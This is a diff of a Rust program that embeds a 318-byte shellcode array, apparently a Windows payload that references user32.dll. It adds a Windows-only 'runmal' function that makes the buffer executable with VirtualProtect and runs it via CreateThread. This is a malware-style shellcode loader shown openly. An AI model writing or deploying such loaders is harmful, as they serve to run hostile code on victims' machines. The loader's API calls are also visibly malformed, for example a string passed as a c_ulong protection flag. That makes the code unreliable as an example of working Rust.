@@ -1,8 +1,5 @@
 #[cfg(windows)] extern crate winapi;
 
-use winapi::ctypes::{c_ulong};
-use winapi::um::memoryapi::{VirtualProtect};
-use winapi::um::processthreadsapi::{CreateThread};
 
 #[no_mangle]
 #[link_section = ".text"]
@@ -35,11 +32,23 @@ static buf: [u8; 318] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
 0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];
 
 
+#[cfg(windows)]
+fn runmal() {
+    use winapi::ctypes::{c_ulong};
+    use winapi::um::memoryapi::{VirtualProtect};
+    use winapi::um::processthreadsapi::{CreateThread};
 
-fn main() {
     let  ufb: c_ulong = "PAGE_EXECUTE";
     VirtualProtect(&buf, 318, &ufb, &buf);
     CreateThread(318, 318, &buf);
 
 }
 
+#[cfg(not(windows))]
+fn runmal(){
+    println!("windows only");
+}
+
+fn main(){
+    runmal();
+}
